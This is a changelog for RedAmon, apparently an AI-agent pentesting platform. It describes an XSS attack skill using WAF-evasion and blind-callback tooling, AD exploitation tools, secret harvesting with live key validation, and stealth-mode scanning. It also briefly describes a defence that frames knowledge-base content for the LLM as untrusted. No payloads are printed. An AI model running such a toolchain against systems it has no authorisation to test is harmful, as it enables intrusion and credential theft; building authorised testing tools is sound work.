- **`_inject_builtin_skill_workflow`** (`agentic/prompts/__init__.py`) -- new `elif` branch for `attack_path_type == "xss"`; gated on `execute_curl` (minimum tool requirement); blind workflow conditionally appended only when `XSS_BLIND_CALLBACK_ENABLED` is true and `kali_shell` is allowed in the active phase
- **`build_attack_path_behavior`** (`agentic/prompts/base.py`) -- new behavior block for `xss` describing informational vs exploitation expectations
- **`tool_registry.py`** -- `kali_shell` description now lists `dalfox` (with full WAF-evasion flag set), `kxss` (with stdin pipe usage example), and `interactsh-client` together as the XSS toolchain
- **DVWS-Node deploy command** -- updated in `guinea_pigs/dvws-node/README.md` from `scp setup.sh` to `scp -r setup.sh xss-lab` so the Argentum sidecar source is shipped alongside the bootstrap script
- **`docker-compose.override.yml`** (generated by `setup.sh`) -- new `argentum` service (`build: ./xss-lab`, exposes 3001 on the internal Docker network), `landing` (nginx) now `depends_on` both `web` and `argentum`

### Notes

- **Major version bump** -- the new built-in skill expands the agent's first-class attack methodology surface by 20% and ships a brand-new comprehensive practice lab. Existing projects automatically inherit `xss:true` (backfilled in Postgres). New projects get it via the Prisma default. No breaking changes to existing skills, workflows, or APIs

---

## [3.9.5] - 2026-04-18

### Added

- **Graph node clustering** -- >threshold same-type leaf neighbors of a shared parent are collapsed into synthetic cluster nodes to keep the canvas readable on large graphs. Clicking a cluster opens a new `ClusterNodeList` drawer with the full list of collapsed children. Chain-family nodes are never clustered; cluster IDs are deterministic (`cluster:<parentId>:<childType>`) and stable across re-renders (2D + 3D canvas, NodeDrawer, `useNodeSelection`)
- **New JS Recon finding types** -- backend ingestion (`recon_mixin`) and download API now handle five additional categories: `emails`, internal IPs (`ip_addresses`, RFC1918), `object_references`, `cloud_assets` (AWS/GCP/Azure with `cloud_provider`, `cloud_asset_type`, `times_seen`, `sample_urls`, `potential_idor`), and `external_domains`. Each type creates its own `JsReconFinding` node linked to the source JS file
- **ExternalLink component** -- shared UI primitive for rendering outbound links consistently across the app, paired with a new `url-utils` helper

### Changed

- **Recon Pipeline nav** -- moved from the Red Zone sub-bar into the top `GlobalHeader`, positioned to the right of Red Zone. Visible when a project is selected; the tab was removed from the graph view's sub-bar
- **Project Settings tab bar** -- tightened top/bottom padding (8px/8px) so the Recon Pipeline tab strip no longer has asymmetric vertical spacing

---

## [3.9.4] - 2026-04-16

### Added

- **Authentication system** -- RedAmon now requires login. Two roles are supported: `admin` (full control) and `standard` (restricted to own scope). Key features:
  - **Login page** -- styled login page with RedAmon branding, dark/light theme support, email + password authentication
  - **JWT sessions** -- signed tokens stored in httpOnly cookies with 7-day expiry. All routes are protected by Next.js middleware
  - **Admin account setup** -- `./redamon.sh install`, `up`, `up dev`, and `update` automatically prompt for admin credentials in the terminal when no admin exists
  - **User management page** -- admin-only page at `/settings/users` to create users (with or without password), set/change passwords, assign roles, and delete users
  - **Role-based UI** -- admins see the full user switcher and "Users" nav link. Standard users see only their own name, change password, and logout
  - **Password change** -- all users can change their own password via the user dropdown. Admins can change any user's password from the management page
  - **CLI password reset** -- `./redamon.sh reset-password` to recover from a forgotten admin password
  - **Service-to-service auth** -- internal Docker services (agent, recon, scanners) use a shared `INTERNAL_API_KEY` header to bypass user authentication. The key is auto-generated during install
  - **Backward compatible** -- existing users without passwords remain accessible via admin switching. No data migration required

### Changed

- **User model** -- added `password` (bcrypt hash, default empty) and `role` (`admin` or `standard`, default `standard`) fields to the Prisma User model
- **API route protection** -- `GET /api/users` now returns only the authenticated user's record for standard users (admin and internal calls see all). `GET /api/users/[id]` enforces ownership checks. `POST /api/users` and `DELETE /api/users/[id]` require admin role
- **UserSelector** -- admin view retains the full user list with role badges and adds logout. Standard view shows only change password and logout
- **GlobalHeader** -- "Users" nav link visible only to admin users
- **ProjectProvider** -- user ID now defaults to the authenticated user. Standard users are locked to their own ID. Admin switching persists across page reloads
- **Docker Compose** -- `AUTH_SECRET` and `INTERNAL_API_KEY` environment variables added to webapp, agent, kali-sandbox, and recon-orchestrator services
- **Backend services** -- all HTTP calls from agentic, recon, recon-orchestrator, gvm-scan, github-secret-hunt, and trufflehog-scan to the webapp API now include the `X-Internal-Key` header
- **Spawned containers** -- recon-orchestrator passes `INTERNAL_API_KEY` to all dynamically spawned containers (recon, partial recon, GVM, GitHub hunt, TruffleHog)

---

## [3.9.3] - 2026-04-14

### Added

- **Parallel Partial Recon** -- run up to 12 partial recon scans concurrently per project. Each run gets a unique `run_id` (UUID), independent container, config file, and SSE log stream. Key changes:
  - **Concurrency limit** -- backend enforces a maximum of 12 simultaneous partial recon runs per project
  - **Mutual exclusion preserved** -- cannot start partial recon while full pipeline is running and vice versa
  - **Per-run stop isolation** -- stopping one partial recon no longer kills sub-containers (naabu, httpx, nuclei, etc.) from other running scans
  - **Auto-cleanup** -- completed/errored runs are automatically removed from state after 60 seconds
- **Partial Recon badges** -- shared `PartialReconBadges` component used in both Graph toolbar and Project Settings header bar. Shows individual badges (up to 3) with tool name, spinner, logs toggle, and stop button. Groups into a dropdown panel when 4+ runs are active
- **Logs drawer in Project Settings** -- launching partial recon from the Workflow View no longer redirects to the Graph page. Instead, a logs drawer opens in-place with real-time SSE streaming. Each new launch switches the drawer to the latest run's logs
- **Running indicator on Workflow nodes** -- tool nodes in the Workflow View show a yellow spinning loader instead of the green play button while their tool has an active partial recon run. The play button is not clickable during execution
- **Start Recon Pipeline disabled during partial recon** -- the "Start Recon Pipeline" button in Project Settings is disabled with a tooltip when any partial recon is running

### Changed

- **SSE connection economy** -- only one SSE log connection is open at a time (the currently visible drawer), avoiding the browser's ~6 concurrent connection limit. Logs for other runs are kept in memory when switching between drawers
- **New API endpoints** -- partial recon endpoints now use `run_id` path parameter: `GET /partial/all`, `GET /partial/{run_id}/status`, `POST /partial/{run_id}/stop`, `GET /partial/{run_id}/logs`. Old single-run endpoints removed

---

## [3.9.2] - 2026-04-13

### Added

- **Per-tool parallelism settings** -- new configurable parallelism/concurrency controls for FFuf, Hakrawler, Katana, Jsluice, Kiterunner, GAU, ParamSpider, and Shodan. Each tool can now process multiple targets concurrently via ThreadPoolExecutor. New Prisma fields, project settings, and frontend controls added across the board
- **DNS parallelism** -- DNS resolution now queries all 7 record types concurrently per host (configurable via `dnsMaxWorkers` and `dnsRecordParallelism` project settings)
- **JS Recon false-positive filters** -- Shannon entropy checks, base64 blob detection, binary/font context filtering, repetitive pattern detection, and URL whitelisting to reduce noise from embedded fonts, minified bundles, and documentation URLs. Filter stats are tracked and reported in the summary
- **JS Recon validation improvements** -- new `format_validated` and `format_invalid` validation statuses for secrets that can only be format-checked (e.g. Twilio SID). Summary now tracks `format_validated` and `incomplete` counts
- **Dockerfile retry helper** -- all `curl`, `wget`, `go install`, and `git clone` commands in agentic, kali-sandbox, and recon Dockerfiles now use a `retry` wrapper (5 attempts with exponential backoff) to handle transient network failures during builds

### Fixed

- **GVM ospd-openvas image tag** -- changed from pinned `22.7.1` (removed from Greenbone registry) to `stable`, fixing GVM install failures reported in #92
- **JS Recon regex precision** -- tightened patterns for AWS Secret Key, Twilio API Key/SID, Twitter Bearer Token, and database URIs with word boundaries and stricter prefix matching to reduce false positives
- **Minified JS context extraction** -- context snippets for findings in minified single-line JS files now extract chars around the match position instead of returning the entire line

---

## [3.9.1] - 2026-04-13

### Added

- **Partial Recon** -- run any single tool from the recon pipeline independently without re-running the entire scan. Every tool section header and Workflow View node has a play button that opens a dedicated modal. The modal shows existing graph data counts (subdomains, IPs, ports, BaseURLs, endpoints), accepts custom targets (subdomains, IPs, ports, URLs, JS file uploads depending on the tool), and launches the tool in isolation. Results are merged back into the Neo4j graph via `MERGE` operations -- duplicates are updated, not recreated. All 20 pipeline tools are supported. Key features:
  - **Graph-aware targeting** -- the modal queries Neo4j for existing data relevant to each tool and displays counts in the Input panel
  - **Custom target injection** -- add subdomains, IPs (IPv4/IPv6/CIDR), ports, or URLs with real-time validation (scope checks, format validation, CIDR range restrictions)
  - **Include graph targets toggle** -- choose whether to scan existing graph data alongside custom inputs, or only scan custom targets
  - **Attach-to dropdowns** -- link custom IPs to a specific subdomain or custom URLs to a specific BaseURL for correct graph relationships
  - **Nuclei settings overrides** -- toggle CVE Lookup, MITRE ATT&CK, and Security Checks independently from project settings
  - **API key warnings** -- the modal checks user settings and warns about missing API keys with impact descriptions per tool
  - **UserInput node tracking** -- custom inputs create UserInput nodes in the graph linked to results via PRODUCED relationships for traceability
  - **Project settings inheritance** -- partial recon runs use the project's saved settings (timeouts, wordlists, thread counts, API keys, proxy, Tor) automatically

---

## [3.9.0] - 2026-04-11

### Added

- **Workflow data node count badges** -- each data node in the Workflow View (Subdomain, Port, BaseURL, etc.) now shows a small badge with the total number of graph nodes of that type. Clicking the badge opens an overlay listing all node names. Uses the graph page's React Query cache for zero extra API calls

---

## [3.8.0] - 2026-04-10

### Added

- **9 new AI agent tools** -- major expansion of the agent's offensive toolkit, all exposed as dedicated MCP tools with full CLI argument passthrough:
  - **execute_httpx** -- HTTP probing and fingerprinting (status codes, titles, server headers, tech detection, redirect following)
  - **execute_subfinder** -- passive subdomain enumeration via OSINT sources (certificate transparency, DNS datasets, search engines). No traffic to target
  - **execute_gau** -- passive URL discovery from Wayback Machine, Common Crawl, AlienVault OTX, and URLScan archives. No traffic to target
  - **execute_jsluice** -- JavaScript static analysis for hidden API endpoints, URL paths, query parameters, and secrets (AWS keys, API tokens). Local file analysis only
  - **execute_katana** -- web crawling and endpoint/URL discovery with JavaScript parsing and known-file enumeration (robots.txt, sitemap.xml)
  - **execute_amass** -- OWASP Amass subdomain enumeration and network mapping (passive + active modes, ASN intel)
  - **execute_arjun** -- HTTP parameter discovery by brute-forcing ~25,000 common parameter names (GET, POST, JSON, XML)
  - **execute_ffuf** -- web fuzzing for hidden directories, files, virtual hosts, and parameters using FUZZ keyword injection
  - **execute_subfinder** -- passive subdomain discovery from third-party OSINT sources

- **URLScan API key integration** -- optional API key for enriching `execute_gau` results with URLScan archived data. Configured in Settings, auto-injected into GAU's `~/.gau.toml` config at runtime

- **Tool Phase Matrix expansion** -- all 9 new tools added to the agent's tool-phase permission matrix with default phase assignments (informational + exploitation). Configurable per-project in the Tool Matrix UI

- **Stealth mode rules for all new tools** -- each new tool has calibrated stealth-mode restrictions:
  - No restrictions: `execute_subfinder`, `execute_gau`, `execute_jsluice` (passive/local only)
  - Heavily restricted: `execute_httpx` (single target, rate-limited), `execute_katana` (depth 1, rate-limited), `execute_amass` (passive mode only)
  - Forbidden: `execute_arjun`, `execute_ffuf` (inherently noisy brute-force tools)

- **Tool registry documentation** -- detailed usage guides for all 9 tools in the agent's tool registry, including argument formats, examples, and when-to-use guidance

- **Graph empty state component** -- new `GraphEmptyState` component replaces the plain text "No data found" message on the graph canvas

### Changed

- **15 new pentesting tools in kali-sandbox** -- major expansion of the agent's kali_shell toolkit, all accessible as Type A tools (no dedicated MCP wrapper needed):
  - **Web/infra scanning:** nikto (web server misconfiguration scanner), whatweb (1800+ plugin tech fingerprinter), testssl.sh (SSL/TLS audit), commix (command injection detection/exploitation), SSTImap (server-side template injection)
  - **DNS:** dnsrecon (zone transfers, SRV records, DNSSEC walk), dnsx (fast bulk DNS resolution, ProjectDiscovery pipeline)
  - **Windows/AD:** enum4linux-ng (SMB/RPC enumeration with JSON output), netexec/nxc (multi-protocol exploitation -- SMB, WinRM, LDAP, MSSQL, RDP), bloodhound-python (AD relationship collection), certipy-ad (AD-CS ESC1-ESC13 attacks), ldapdomaindump (quick LDAP dumps)
  - **Secrets/passwords:** gitleaks (git repo secret scanning), hashid (hash type identification), cewl (custom wordlist generation from target websites)

- **kali_shell timeout increased** -- from 120s to 300s (5 min), enabling tools like nikto, testssl.sh, and bloodhound-python that need more than 2 minutes. Updated across MCP server, tool registry, dev docs, and wiki

- **Kali sandbox Dockerfile** -- installs subfinder, katana, jsluice (with CGO for tree-sitter), amass, gau, and paramspider. Adds arjun to Python requirements

- **kali_shell tool description** -- restructured into categorized sections (Exploitation, Password cracking, Web/infra, DNS, Windows/AD, API/GraphQL, Secrets, Tunneling) with usage examples for every tool. Added all 15 new tools, restored missing entries (dig, nslookup, smbclient, ngrok, chisel), and expanded the "Do NOT use" list to cover all 17 dedicated MCP tools

- **Rules of Engagement (ROE)** -- `execute_ffuf` added to brute_force category for ROE blocking

- **redamon.sh update logic** -- agent container now always rebuilds (not just restarts) when any `agentic/` file changes, since source code is baked into the image without volume mount

- **Settings page** -- removed "AI Agent" badge from Censys, FOFA, AlienVault OTX, Netlas, VirusTotal, ZoomEye, and Criminal IP API key fields (these keys are used by Recon Pipeline only, not the agent)

---

## [3.7.0] - 2026-04-09

### Added

- **RAG-Enhanced Knowledge Base** -- the `web_search` tool now queries a local vector index (FAISS) and graph database (Neo4j) before falling back to Tavily. Curated security datasets are embedded, indexed, and searched locally with a 6-stage hybrid retrieval pipeline (vector search + keyword search, RRF fusion, cross-encoder reranking, MMR diversity filtering). When the KB produces high-confidence results, Tavily is skipped entirely. When confidence is low, KB and Tavily results are merged automatically

- **Seven security data sources** -- tool_docs (agent skill playbooks), GTFOBins (Unix priv-esc), LOLBAS (Windows LOLBins), OWASP WSTG (web testing methodology), ExploitDB (exploit database), NVD (CVEs via REST API), and Nuclei templates. Organized in four ingestion profiles: `cpu-lite` (~900 chunks, ~15 min on CPU), `lite` (~47k chunks), `standard` (+ NVD), `full` (+ Nuclei)

- **Smart ingestion on install** -- `./redamon.sh install` detects GPU and API key availability. On CPU without an API key, shows an interactive prompt with estimated times per source and lets the user choose quick start (~15 min) or full ingestion (~4 hours). With GPU or API key, ingests all sources automatically

- **API embedding support** -- configure `KB_EMBEDDING_USE_API=true` in `.env` to use any OpenAI-compatible embedding API (OpenAI, Ollama, Together AI, Azure, vLLM, LiteLLM) instead of local sentence-transformers. Speeds up ingestion from hours to minutes on CPU-only machines. See `.env.example` for configuration

- **Incremental updates** -- two-layer content-hash dedup (file-level + chunk-level) makes re-runs near-instant. Only new or modified content is re-embedded. NVD uses `lastModStartDate` for incremental delta fetches

- **Prompt injection defense** -- KB content is untrusted (sourced from public repos). Three-layer protection: content sanitization (strips role/boundary markers), length capping, and untrusted content framing with explicit LLM instructions

- **Dimension mismatch guard** -- switching embedding models (local vs API) produces different vector dimensions. The ingestion pipeline detects mismatches and requires `--rebuild` to prevent silent corruption

- **Makefile for KB management** -- `knowledge_base/Makefile` with targets for build, update, rebuild, stats, and cleanup. All `redamon.sh` KB commands use `MODE=docker` to run inside the agent container

### Changed

- **Agent Dockerfile** -- pre-downloads embedding model (`intfloat/e5-large-v2`, ~1.3 GB) and cross-encoder reranker (`BAAI/bge-reranker-base`, ~568 MB) at build time. KB source code set to read-only via `chmod`

- **docker-compose.yml** -- agent service now loads `.env` via `env_file` (optional). KB data volume mounted read-write for ingestion. Added opt-in `kb-refresh` sidecar for automated daily/weekly/monthly updates

- **Bash compatibility fix** -- replaced `${confirm,,}` (Bash 4+ only) with `=~ ^[Yy]$` regex in `cmd_clean()` for compatibility with older Bash versions and macOS

---

## [3.6.2] - 2026-04-06

### Fixed

- **Pipeline crash resilience** -- wrapped all recon pipeline phase calls (`run_http_probe`, `run_resource_enum`, `run_vuln_scan`, `run_mitre_enrichment`) in try/except in both domain and IP mode. A failing phase now logs the error, records it in `metadata.phase_errors`, and continues to the next phase instead of killing the entire pipeline
- **JS Recon analyzer crash isolation** -- added per-file try/except in all JS Recon analyzer loops (`run_patterns`, `run_framework_analysis`, `discover_and_analyze_sourcemaps`, `detect_dependency_confusion`, `extract_endpoints`, `detect_frameworks`, `detect_dom_sinks`). One malformed JS file no longer crashes the entire analyzer batch
- **Docker API 500 crash** -- added `APIError` handling alongside existing `NotFound` catches in all four container status functions (`get_status`, `get_gvm_status`, `get_github_hunt_status`, `get_trufflehog_status`) and all four SSE log streaming functions. A Docker daemon 500 error during container inspection no longer crashes the SSE stream with an unhandled `ExceptionGroup`

### Added

- **Crash resilience test suite** -- new `recon/tests/test_crash_resilience.py` with 17 tests (12 local + 5 Docker-dependent) verifying that poisoned/malformed input in any analyzer batch is caught, logged, and skipped without affecting other items in the batch

---

## [3.6.1] - 2026-04-05

### Fixed

- **WorkflowView build failure** -- aligned `onSave` prop type from `() => void` to `() => Promise<void>` to match `WorkflowNodeModal`'s expected signature

---

## [3.6.0] - 2026-04-05

### Added

- **Recon Pipeline Workflow View** -- interactive visual diagram of the entire reconnaissance pipeline, available as an alternative to the tabbed settings interface. Toggle between Tab View and Workflow View using the icons at the left edge of the Recon Pipeline tab group:
  - **Three-band layout** -- tools in the center horizontal row, consumed data nodes above, produced data nodes below, with dashed animated edges showing data flow direction
  - **22 tool nodes** covering all pipeline stages: Discovery (Subdomain Discovery, URLScan, Uncover), OSINT (Shodan, OSINT Enrichment), Port Scanning (Naabu, Masscan, Nmap), HTTP Probing (Httpx), Resource Enumeration (Katana, Hakrawler, jsluice, FFuf, GAU, ParamSpider, Kiterunner, Arjun), JS Recon, Vulnerability Scanning (Nuclei), CVE & MITRE (CVE Lookup, MITRE), Security Checks
  - **18 data node types** as visible convergence points (Domain, Subdomain, IP, DNSRecord, Port, Service, BaseURL, Endpoint, Parameter, Header, Certificate, Technology, Vulnerability, CVE, MitreData, Capec, Secret, ExternalDomain), colored by category (identity, network, web, technology, security, external)
  - **Chain-breaking detection** -- when a tool is enabled but its required input data has no active producer, the data node turns red (starved) and the tool shows an amber warning with a detailed tooltip. Uses "true source" algorithm that excludes tools recycling their own output (e.g., Katana consumes and produces BaseURL)
  - **Click highlighting** -- click any tool or data node to highlight it and all directly connected elements; non-connected edges dim for visual clarity
  - **Inline enable/disable toggles** on each tool node, with changes immediately reflected in both views
  - **Settings modal** -- click the gear icon on any tool to open the full settings panel (identical to Tab View) in a modal overlay
  - **Shared state** -- both views read and write the same form data with zero re-fetching; React Query cache untouched
  - **Code-split** -- Workflow View loaded via `next/dynamic` so React Flow only loads when the workflow toggle is activated

- **Verified node mapping** -- deep-audited every tool's consumes/produces against the actual recon pipeline code. Fixed 15+ inaccuracies in the node mapping (added missing ExternalDomain outputs to 8 tools, corrected Shodan/Masscan/Nmap/Httpx input dependencies, added Technology output to Shodan/OSINT Enrichment/JsRecon, removed incorrect Service/Domain consumption from multiple tools)

### Changed

- **Node mapping corrections** -- updated `nodeMapping.ts` with verified produces/consumes for all 22 recon tools. Affects both the workflow diagram edges and the NodeInfoTooltip in tab mode

---

## [3.5.1] - 2026-04-05

### Added

- **WPScan WordPress scanner** -- new `execute_wpscan` agentic tool (Type B MCP) for WordPress vulnerability scanning. Detects vulnerable plugins, themes, users, config backups, and misconfigurations. 600s timeout, HEAVILY RESTRICTED in stealth mode, added to brute_force RoE category. Available in informational and exploitation phases.

### Fixed

- **Graph 3D rendering** -- removed LOD (Level-of-Detail) system that was causing disconnected edges and low-quality nodes during live recon. 3D now always renders at full quality (16-segment spheres, glow, wireframes, labels, particles)
- **Graph 3D labels** -- labels now hide/show based on camera distance (300 unit threshold), improving readability when zoomed out

### Changed

- **Auto-switch to 2D** -- graphs with more than 1,000 nodes automatically switch to 2D rendering. The 3D toggle is disabled with a tooltip explaining the reason
- **2D progressive quality reduction** -- 2D canvas progressively disables glow and particles above 1,000 nodes to maintain performance
- **2D force layout** -- increased link distance (80) and capped charge repulsion range (250) so clusters are more spread internally and closer to each other
- **Polling auto-stop** -- graph polling (5s interval during recon/agent) stops when graph exceeds 2,000 nodes to prevent performance degradation
- **2D performance tiers** -- adjusted thresholds: full (0-1000), reduced (1001-2000), minimal (2001-5000), ultra-minimal (5000+)

---

## [3.5.0] - 2026-04-04

### Added

- **Recon Preset System** -- one-click recon configuration with 21 built-in presets covering common scanning scenarios. Each preset configures 328+ recon pipeline parameters (tool toggles, thresholds, rate limits, OSINT flags, etc.) in a single click:
  - **Built-in Presets**: Full Pipeline Active/Passive/Maximum, Bug Bounty Quick Wins, Bug Bounty Deep Dive, API Security Audit, Infrastructure Mapper, OSINT Investigator, Web App Pentester, JS Secret Miner, Subdomain Takeover Hunter, Stealth Recon, CVE Hunter, Red Team Operator, Directory & Content Discovery, Cloud & External Exposure, Compliance & Header Audit, Secret & Credential Hunter, Parameter & Injection Surface, DNS & Email Security, Network Perimeter Large Scale
  - **Recon Preset tab** in Recon Pipeline tab group (lightning bolt icon) opens a modal with card grid UI, expandable detail descriptions, and "Applied" badge tracking
  - **Zod-validated schema** with 328 parameters covering all recon tools. Uses `.strip()` to prevent unknown key injection

- **My Project Presets** -- save, load, and delete user project presets that capture the entire project configuration (recon pipeline, agent behavior, tool matrix, agent skills, CypherFix, and all other settings). Target-specific fields (domain, subdomains, IPs, RoE document, uploaded files) are automatically stripped for portability:
  - **Save as Preset** button in project form header saves current config with name + description
  - **Load Preset** button opens side drawer listing saved presets with merge-over-defaults loading
  - Per-user storage in PostgreSQL (`UserProjectPreset` model)

- **AI-Generated Presets** -- describe scanning goals in natural language and an LLM generates a validated recon preset. Two-step wizard (Describe -> Review) with enabled/disabled/tuned parameter summary:
  - Supports all configured LLM providers (Anthropic, OpenAI, OpenRouter, OpenAI-compatible, Bedrock)
  - System prompt with full recon parameter catalog guides the LLM
  - Zod validation + JSON extraction pipeline with error details on failure
  - Generated presets saved to My Project Presets collection

- **Wiki documentation** -- new [Recon & Project Presets](https://github.com/samugit83/redamon/wiki/Recon-Presets) wiki page with full guide, 21-preset reference table, and AI generation walkthrough. Updated Creating a Project (16 tabs), Project Settings Reference, Running Reconnaissance, Home, and Sidebar

---

## [3.4.0] - 2026-04-03

### Added

- **JS Recon Scanner** -- comprehensive JavaScript reconnaissance module that runs as GROUP 5b in the recon pipeline (post-resource_enum, pre-vuln_scan). Analyzes JS files discovered by Katana/Hakrawler/GAU for secrets, hidden endpoints, dependency confusion vulnerabilities, source maps, DOM sinks, and framework fingerprints:
  - **Secret Detection**: 100 hardcoded regex patterns covering cloud credentials (AWS, GCP, Azure, Firebase, DigitalOcean, Cloudflare), payment keys (Stripe, PayPal, Square, Razorpay), auth tokens (GitHub, GitLab, Slack, Discord, Twilio, SendGrid, Telegram, 20+ services), JS-specific services (Sentry, Algolia, Mapbox, Pusher, Supabase, OpenAI, Vercel), database URIs, JWTs, private keys, and infrastructure URLs
  - **Key Validation**: 21 service-specific validators that make live API calls to confirm if discovered keys are active (AWS STS, GitHub /user, Stripe /v1/account, etc.). Rate-limited at 1 req/sec per service. Disabled in stealth mode
  - **Source Map Discovery**: probes for `.map` files via sourceMappingURL comments, SourceMap HTTP headers, and 8 common path patterns. Parses discovered maps to extract original source filenames and scan sourcesContent for embedded secrets
  - **Dependency Confusion Detection**: extracts scoped npm packages from import/require/export statements and webpack chunk names, checks each against public npm registry. Missing packages flagged as CRITICAL (attacker could register and execute arbitrary code)
  - **Deep Endpoint Extraction**: extracts REST API calls (fetch, axios, $.ajax, XMLHttpRequest), GraphQL queries/mutations/introspection, WebSocket connections, React/Vue/Angular router definitions, admin/debug/auth endpoints, API documentation paths (/swagger, /openapi.json, /graphiql)
  - **Framework Fingerprinting**: detects 12 frameworks with version extraction (React, Next.js, Vue.js, Nuxt.js, Angular, jQuery, Svelte, Ember, Backbone, Lodash, Moment.js, Bootstrap)
  - **DOM Sink Detection**: 17 patterns for XSS vectors (innerHTML, eval, document.write, dangerouslySetInnerHTML), prototype pollution (__proto__, constructor.prototype), URL manipulation (location.href, window.open), and cross-origin messaging (postMessage)
  - **Developer Comment Mining**: extracts TODO/FIXME/HACK/BUG/XXX markers and comments containing sensitive keywords (password, secret, token, credential, bypass)
  - **Custom Extension Files**: upload JSON/TXT files to extend built-in patterns (custom secret regexes, source map probe paths, internal package names, endpoint keywords, framework signatures). Help guide modal with format docs + examples for each upload type. Client-side validation before upload
  - **Manual JS File Upload**: upload .js/.mjs/.map/.json files from Burp Suite, mobile APKs, DevTools, or authenticated areas for analysis without crawling
  - **25 project settings** across all 4 layers (Prisma schema, Python DEFAULT_SETTINGS, fetch_project_settings mapping, /defaults auto-serve). Includes enable toggle, max files, timeout, concurrency, 7 module toggles, 3 coverage expansion flags, min confidence filter, and 6 custom file upload paths
  - **New "JS Recon" tab** in Recon Pipeline settings group (between Resource Enum and Vulnerability Scanning) with collapsible sub-sections for analysis scope, JS file sources, detection modules, key validation, custom extension files, and manual JS upload
  - **Graph DB integration**: new `JsReconFinding` node type (fuchsia-600 color) with `(BaseURL)-[:HAS_JS_FINDING]->(JsReconFinding)` for pipeline discoveries and `(Domain)-[:HAS_JS_FINDING]->(JsReconFinding)` for uploaded file findings. Secret nodes extended with `source='js_recon'`, `validation_status`, `validation_info`, `confidence`, `detection_method` properties. Endpoint nodes with `source='js_recon'`
  - **Neo4j schema**: unique constraint + tenant index for JsReconFinding. ON CREATE/ON MATCH pattern for Endpoints to avoid overwriting resource_enum source
  - **AI Agent integration**: TEXT_TO_CYPHER_SYSTEM updated with JsReconFinding node schema, HAS_JS_FINDING relationship, example Cypher queries, and combined "all secrets" query including Domain-linked uploads. Tool registry updated with JsReconFinding in node list
  - **Subdomain feedback loop**: JS-discovered in-scope subdomains merged back into combined_result for downstream modules
  - **Security**: matched_text (raw secrets) redacted before writing to disk. Short secrets (<=12 chars) also redacted. Path traversal protection on all upload API routes via PROJECT_ID_RE regex validation. Upload file size limits (10MB JS, 2MB custom). JSON validation before accepting .json uploads
  - **Stealth mode overrides**: JS_RECON_MAX_FILES=50, VALIDATE_KEYS=False, INCLUDE_CHUNKS=False, INCLUDE_FRAMEWORK_JS=False
  - **72 unit tests** covering all 6 analysis modules + integration tests

- **JS Recon DataTable view** -- new "JS Recon" option in the Graph page DataTable dropdown (alongside "All Nodes"). Specialized table with 6 sub-tabs (Secrets, Endpoints, Dependencies, Source Maps, Security Patterns, Attack Surface) displaying JS Recon findings with purpose-built columns. Universal search across all text fields. XLSX export with 13 sheets. Fetches data from `/api/js-recon/{projectId}/download`

- **DataTable view mode dropdown** -- the "Data Table" tab on the Graph page now has a dropdown arrow to switch between "All Nodes" (generic node table) and "JS Recon" (specialized findings table). Bottom bar node filters hidden for JS Recon view

- **View Mode + Labels toggles moved** -- 2D/3D toggle and Labels toggle moved from GraphToolbar to ViewTabs right section (visible only when Graph Map is active). Tunnel badges moved from ViewTabs to GraphToolbar next to PAUSE ALL button

### Changed

- **Report generation** -- added Secret, TruffleHog, JS Recon, OTX threat intelligence sections to HTML/PDF report generation (reportData.ts + reportTemplate.ts). Risk score now includes secrets, TruffleHog findings, JS Recon findings, and OTX threat data

- **Bottom bar visibility** -- PageBottomBar (node type filters, session controls, stats) now hidden for Reverse Shell, RedAmon Terminal, RoE, and JS Recon views. Only visible for Graph Map, Graph Views, and All Nodes

---

## [3.3.0] - 2026-04-01

### Added

- **Chat Skills (`/skill` command)** -- on-demand reference injection system for the AI agent chat. Chat Skills are tactical reference docs (tool playbooks, vulnerability guides, framework notes) that you inject into the agent's context exactly when you need them, without affecting classification or phase routing:
  - **`/skill` command**: type `/skill ssrf` to activate a skill, `/skill ssrf test the API` to activate and send a message in one shot, `/skill list` to browse all skills, `/skill remove` to deactivate
  - **Skill picker button**: lightning bolt button next to send -- click to browse all skills grouped by category, click a skill to activate instantly. Includes "Import from Community" and "Upload .md" buttons directly in the dropdown
  - **Slash autocomplete**: typing `/s` anywhere in the input triggers a floating dropdown with filtered skills -- arrow keys to navigate, Enter to select, works mid-sentence
  - **Active skill badge**: shows the active skill name and category above the input with an X button to remove. Persists across messages until changed or removed
  - **Persistent activation**: once activated, skill context is included with every subsequent message (prepended for new queries, injected via guidance queue for running agents)
  - **Global Settings tab**: new "Chat Skills" tab between Agent Skills and API Keys with upload, edit description, download, delete, and category filtering
  - **Import from Community**: bulk-import all 36 shipped reference skills (or community Agent Skills) with one click -- available in both Global Settings and the chat skill picker
  - **WebSocket integration**: `SKILL_INJECT` / `SKILL_INJECT_ACK` message types push skill content through the existing guidance queue pipeline
  - **Database**: `UserChatSkill` Prisma model with per-user storage, category field, and full CRUD API routes
  - **36 community Chat Skills** by [@blackkhawkk](https://github.com/blackkhawkk) covering 7 categories: vulnerabilities (17), tooling (9), scan modes (3), frameworks (3), technologies (2), protocols (1), coordination (1)
  - **15 skill categories**: general, vulnerabilities, tooling, scan_modes, frameworks, technologies, protocols, coordination, cloud, mobile, api_security, wireless, network, active_directory, social_engineering, reporting
  - **Security**: path traversal protection in `load_skill_content()` via `.resolve().is_relative_to()` containment check

- **Amass Brute Force Wordlist Selector** -- configurable wordlist selection for Amass DNS brute forcing:
  - **Wordlist selector UI**: checkbox list under the Amass Bruteforce toggle in project settings. Amass Default (~8K entries) is always active and cannot be unchecked. jhaddix all.txt (~2.18M entries) is optional with time estimate badge
  - **jhaddix all.txt**: Jason Haddix's comprehensive subdomain wordlist (~2.18M entries compiled from certificate transparency, bug bounty findings, DNS datasets) baked into the `redamon-recon` Docker image
  - **Prisma schema**: `amassBruteWordlists` JSON field on Project model (default: `["default"]`)
  - **Future extensibility**: adding more wordlists is just a `.txt` file in `recon/wordlists/` + a checkbox entry in the UI

- **Import from Community for Agent Skills** -- new "Import from Community" button in Global Settings > Agent Skills tab. Bulk-imports all `.md` workflow files from `agentic/community-skills/` into the user's personal Agent Skills library with duplicate-by-name skipping

### Fixed

- **Amass wordlist mount bug** -- `os.path.isfile()` was checking a host filesystem path from inside the recon container, always returning `False`. The jhaddix wordlist was never mounted into the Amass container. Fixed to check the container-local path (`/app/recon/wordlists/jhaddix-all.txt`) and use the host path only for the Docker `-v` bind mount

### Removed

